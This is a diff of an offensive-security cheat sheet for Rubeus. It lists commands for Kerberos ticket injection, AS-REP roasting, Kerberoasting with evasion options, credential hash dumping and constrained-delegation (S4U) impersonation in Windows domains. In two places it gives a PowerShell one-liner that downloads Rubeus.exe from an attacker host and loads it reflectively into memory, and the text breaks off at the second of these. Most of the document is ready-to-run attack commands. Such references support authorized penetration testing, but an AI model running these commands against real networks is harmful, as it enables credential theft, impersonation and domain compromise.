@@ -2,121 +2,141 @@
 
 % ad, windows, rubeus
 
-## inject ticket from file
+## Rubeus - Inject Ticket from File
+Injects a Kerberos ticket from a .kirbi file into the current session.
 #plateform/windows #target/local #cat/UTILS  
 ```cmd
-.\Rubeus.exe ptt /ticket:<ticket>
+.\Rubeus.exe ptt /ticket:<ticket_file_path>
 ```
 
-## load rubeus from powershell
+## Rubeus - Load from PowerShell (Local)
+Loads Rubeus from a local executable into PowerShell memory.
 #plateform/windows #target/local #cat/UTILS 
 ```powershell
-$data = (New-Object System.Net.WebClient).DownloadData('http://<lhost>/Rubeus.exe');$assem = [System.Reflection.Assembly]::Load($data);
+[System.Reflection.Assembly]::Load([System.IO.File]::ReadAllBytes("C:\Path\To\Rubeus.exe"))
 ```
 
-## execute rubeus from powershell
+## Rubeus - Execute from PowerShell
+Executes a Rubeus command directly from PowerShell after loading the assembly.
 #plateform/windows #target/remote #cat/UTILS 
 ```powershell
 [Rubeus.Program]::MainString("klist");
 ```
 
-## monitor
+## Rubeus - Monitor Kerberos Activity
+Monitors for Kerberos activity, filtering by user.
 #plateform/windows #target/remote #cat/ATTACK/EXPLOIT  
 ```cmd
 .\Rubeus.exe monitor /interval:5 /filteruser:<machine_account>
 ```
 
-## inject ticket from b64 blob
+## Rubeus - Inject Ticket from Base64 Blob
+Injects a Kerberos ticket from a Base64 encoded blob.
 #plateform/windows #target/local #cat/UTILS  
 ```cmd
 .\Rubeus.exe ptt /ticket:<BASE64BLOBHERE>
 ```
 
-## check ASPREPRoast for all users in current domain
+## Rubeus - AS-REP Roasting (All Users)
+Checks for AS-REP Roasting vulnerability for all users in the current domain.
 #plateform/windows #target/remote #cat/ATTACK/EXPLOIT  
 ```cmd
-.\Rubeus.exe asreproast  /format:<AS_REP_response_format> /outfile:<output_hashes_file>
+.\Rubeus.exe asreproast /format:<AS_REP_response_format> /outfile:<output_hashes_file>
 ```
 
-## ASREPRoast specific user
+## Rubeus - AS-REP Roasting (Specific User)
+Performs AS-REP Roasting for a specific user.
 #plateform/windows #target/remote #cat/ATTACK/EXPLOIT  
 ```cmd
-.\Rubeus.exe asreproast  /user:<user> /domain:<domain_name> /format:<AS_REP_response_format> /outfile:<output_hashes_file>
+.\Rubeus.exe asreproast /user:<user> /domain:<domain_name> /format:<AS_REP_response_format> /outfile:<output_hashes_file>
 ```
 
-## kerberoasting - current domain
+## Rubeus - Kerberoasting (Current Domain)
+Performs Kerberoasting for service principal names (SPNs) in the current domain.
 #plateform/windows #target/remote #cat/ATTACK/EXPLOIT  
 ```cmd
 .\Rubeus.exe kerberoast /outfile:<output_TGSs_file>
 ```
 
-## Kerberoasting and outputting on a file with a specific format
+## Rubeus - Kerberoasting (Specific Domain)
+Performs Kerberoasting for SPNs in a specific domain.
 #plateform/windows #target/remote #cat/ATTACK/EXPLOIT  
 ```cmd
 .\Rubeus.exe kerberoast /outfile:<output_TGSs_file> /domain:<domain_name>
 ```
 
-## Kerberoasting while being "OPSEC" safe, essentially while not try to roast AES enabled accounts
+## Rubeus - Kerberoasting (OPSEC Safe - RC4)
+Performs Kerberoasting while avoiding AES-enabled accounts for OPSEC.
 #plateform/windows #target/remote #cat/ATTACK/EXPLOIT  
 ```cmd
 .\Rubeus.exe kerberoast /outfile:<output_TGSs_file> /domain:<domain_name> /rc4opsec
 ```
 
-## Kerberoast AES enabled accounts
+## Rubeus - Kerberoast AES Enabled Accounts
+Performs Kerberoasting specifically targeting AES-enabled accounts.
 #plateform/windows #target/remote #cat/ATTACK/EXPLOIT  
 ```cmd
 .\Rubeus.exe kerberoast /outfile:<output_TGSs_file> /domain:<domain_name> /aes
 ```
  
-## Kerberoast specific user account
+## Rubeus - Kerberoast Specific User Account
+Performs Kerberoasting for a specific user account.
 #plateform/windows #target/remote #cat/ATTACK/EXPLOIT  
 ```cmd
 .\Rubeus.exe kerberoast /outfile:<output_TGSs_file> /domain:<domain_name> /user:<user> /simple
 ```
 
-## get hash
+## Rubeus - Get User Hash
+Retrieves the NTLM hash for a specified user.
 #plateform/windows #target/remote #cat/POSTEXPLOIT/CREDS_RECOVER 
 ```cmd
 .\Rubeus.exe hash /user:<user> /domain:<domain_name> /password:<password>
 ```
 
-## dump - will dump any relevant cached TGS ticket’s stored
+## Rubeus - Dump Cached Tickets
+Dumps any relevant cached TGS tickets stored in the current session.
 #plateform/windows #target/local #cat/POSTEXPLOIT/CREDS_RECOVER 
 ```
 .\Rubeus.exe dump
 ```
 
-## ask and inject ticket
+## Rubeus - Ask and Inject Ticket
+Requests a TGT for a user and injects it into the current session.
 #plateform/windows #target/remote #cat/ATTACK/CONNECT 
 ```
 .\Rubeus.exe asktgt /user:<user> /domain:<domain_name> /rc4:<ntlm_hash> /ptt
 ```
 
-## S4U - with ticket - Constrained delegation
+## Rubeus - S4U with Ticket (Constrained Delegation)
+Performs S4U with a ticket for constrained delegation.
 #plateform/windows #target/remote #cat/ATTACK/EXPLOIT 
 ```
 .\Rubeus.exe s4u /ticket:<ticket> /impersonateuser:<user> /msdsspn:ldap/<domain_fqdn> /altservice:cifs /ptt
 ```
 
-## S4U - with hash - Constrained delegation
+## Rubeus - S4U with Hash (Constrained Delegation)
+Performs S4U with an NTLM hash for constrained delegation.
 #plateform/windows #target/remote #cat/ATTACK/EXPLOIT 
 ```
 .\Rubeus.exe s4u /user:<user> /rc4:<NTLMhashedPasswordOfTheUser> /impersonateuser:<user_to_impersonate> /msdsspn:ldap/<domain_fqdn> /altservice:cifs /domain:<domain_name> /ptt
 ```
 
-## get rc4 of machine with the password
+## Rubeus - Get RC4 Hash of Machine Account
+Retrieves the RC4 hash of a machine account's password.
 #plateform/windows #target/local #cat/POSTEXPLOIT/CREDS_RECOVER 
 ```
 .\Rubeus.exe hash /password:<machine_password>
 ```
 
-## S4U - Resource based constrained delegation
+## Rubeus - S4U (Resource-Based Constrained Delegation)
+Performs S4U for resource-based constrained delegation.
 #plateform/windows #target/remote #cat/ATTACK/EXPLOIT 
 ```
 .\Rubeus.exe s4u /user:<MachineAccountName> /rc4:<RC4HashOfMachineAccountPassword> /impersonateuser:<user_to_impersonate> /msdsspn:cifs/<domain_fqdn> /domain:<domain_name> /ptt
 ```
 
-## Rubeus Reflection assembly
+## Rubeus - Load and Execute via Reflection (PowerShell)
+Loads and executes Rubeus commands in PowerShell using reflection.
 #plateform/windows #target/remote #cat/ATTACK/EXPLOIT 
 ```powershell
 $data = (New-Object System.Net.WebClient).DownloadData('http://<ip>/Rubeus.exe')  
